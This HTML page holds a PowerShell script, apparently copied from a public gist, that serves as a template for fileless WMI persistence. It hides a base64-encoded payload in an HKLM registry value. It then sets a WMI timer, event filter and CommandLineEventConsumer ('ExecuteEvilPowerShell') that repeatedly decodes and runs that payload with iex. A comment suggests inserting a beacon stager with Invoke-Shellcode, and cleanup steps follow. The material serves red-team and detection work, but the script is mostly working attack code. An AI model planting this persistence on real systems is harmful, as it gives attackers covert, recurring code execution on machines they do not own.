<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>WMI_Persistence_Template.ps1</title>
</head><body>#mattifestation https://gist.github.com/mattifestation/e55843eef6c263608206<br/>
#Fileless WMI persistence payload template (CommandlineEventConsumer, __IntervalTimerInstruction trigger, w/ registry payload storage)<br/>
# Step #1 - Prep payload<br/>
$Hive = 'HKLM'<br/>
$PayloadKey = 'SOFTWARE\PayloadKey'<br/>
$PayloadValue = 'PayloadValue'<br/>
$TimerName = 'PayloadTrigger'<br/>
$EventFilterName = 'TimerTrigger'<br/>
$EventConsumerName = 'ExecuteEvilPowerShell'<br/>
<br/>
switch ($Hive) {<br/>
&nbsp; &nbsp; 'HKLM' { $HiveVal = [UInt32] 2147483650 }<br/>
&nbsp; &nbsp; 'HKCU' { $HiveVal = [UInt32] 2147483649 }<br/>
&nbsp; &nbsp; 'HKU' &nbsp;{ $HiveVal = [UInt32] 2147483651 }<br/>
&nbsp; &nbsp; 'HKCR' { $HiveVal = [UInt32] 2147483648 }<br/>
&nbsp; &nbsp; 'HKCC' { $HiveVal = [UInt32] 2147483653 }<br/>
}<br/>
<br/>
$TimerArgs = @{<br/>
&nbsp; &nbsp; IntervalBetweenEvents = ([UInt32] 10000) # 43200000 to trigger every 12 hours<br/>
&nbsp; &nbsp; SkipIfPassed = $False<br/>
&nbsp; &nbsp; TimerId = $TimerName<br/>
}<br/>
# i.e. payload will be stored in HKLM\SOFTWARE\PayloadKey - PayloadValue (REG_SZ)<br/>
<br/>
$Payload = {<br/>
&nbsp; &nbsp; # Prep your raw beacon stager along with Invoke-Shellcode here<br/>
<br/>
&nbsp; &nbsp; "Owned at $(Get-Date)" | Out-File C:\payload_result.txt<br/>
}<br/>
<br/>
$EncodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Payload))<br/>
<br/>
# Payload to be executed in the CommandLineEventConsumer upon triggering of the __IntervalTimerInstruction event.<br/>
$StagerPayload = "powershell.exe -NoP -C `"iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-ItemProperty -Path $($Hive):\$PayloadKey -Name $PayloadValue).$PayloadValue)))`""<br/>
<br/>
# Step #2 - Create payload reg key<br/>
$Result = Invoke-WmiMethod -Namespace root/default -Class StdRegProv -Name CreateKey -ArgumentList @($HiveVal, $PayloadKey)<br/>
if ($Result.ReturnValue -ne 0) {<br/>
&nbsp; &nbsp; Write-Warning "Unable to create key: HKLM\$PayloadKey. Return value: $($Result.ReturnValue)"<br/>
}<br/>
<br/>
# Step #3 - Store payload in reg value<br/>
$Result = Invoke-WmiMethod -Namespace root/default -Class StdRegProv -Name SetStringValue -ArgumentList @($HiveVal, $PayloadKey, $EncodedPayload, $PayloadValue)<br/>
if ($Result.ReturnValue -ne 0) {<br/>
&nbsp; &nbsp; Write-Warning "Unable to store payload in HKLM\$PayloadKey $PayloadValue (REG_SZ). Return value: $($Result.ReturnValue)"<br/>
}<br/>
<br/>
# Step #4 - Validate that the payload stored<br/>
$Result = Invoke-WmiMethod -Namespace root/default -Class StdRegProv -Name GetStringValue -ArgumentList @($HiveVal, $PayloadKey, $PayloadValue)<br/>
if ($Result.ReturnValue -ne 0) {<br/>
&nbsp; &nbsp; Write-Warning "Unable to store payload in HKLM\$PayloadKey $PayloadValue (REG_SZ). Return value: $($Result.ReturnValue)"<br/>
}<br/>
<br/>
if ($Result.sValue -ne $EncodedPayload) {<br/>
&nbsp; &nbsp; Write-Warning "The payload was not properly stored in HKLM\$PayloadKey $PayloadValue (REG_SZ)."<br/>
}<br/>
<br/>
# Step #5 - Create the timer event<br/>
$Timer = Set-WmiInstance -Namespace root/cimv2 -Class __IntervalTimerInstruction -Arguments $TimerArgs<br/>
<br/>
# Step #6 - Create event filter<br/>
$EventFilterArgs = @{<br/>
&nbsp; &nbsp; EventNamespace = 'root/cimv2'<br/>
&nbsp; &nbsp; Name = $EventFilterName<br/>
&nbsp; &nbsp; Query = "SELECT * FROM __TimerEvent WHERE TimerID = '$TimerName'"<br/>
&nbsp; &nbsp; QueryLanguage = 'WQL'<br/>
}<br/>
<br/>
$Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs<br/>
<br/>
# Step #7 - Create CommandLineEventConsumer<br/>
$CommandLineConsumerArgs = @{<br/>
&nbsp; &nbsp; Name = $EventConsumerName<br/>
&nbsp; &nbsp; CommandLineTemplate = $StagerPayload<br/>
}<br/>
<br/>
$Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs<br/>
<br/>
# Step #8 - Create FilterToConsumerBinding<br/>
$FilterToConsumerArgs = @{<br/>
&nbsp; &nbsp; Filter = $Filter<br/>
&nbsp; &nbsp; Consumer = $Consumer<br/>
}<br/>
<br/>
$FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs<br/>
<br/>
# Cleanup<br/>
$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$EventConsumerName'"<br/>
$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = '$EventFilterName'"<br/>
$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"<br/>
$TimerToCleanup = Get-WmiObject -Namespace root/cimv2 -Class __IntervalTimerInstruction -Filter "TimerId = '$TimerName'"<br/>
<br/>
$FilterConsumerBindingToCleanup | Remove-WmiObject<br/>
$EventConsumerToCleanup | Remove-WmiObject<br/>
$EventFilterToCleanup | Remove-WmiObject<br/>
$TimerToCleanup | Remove-WmiObject</body></html>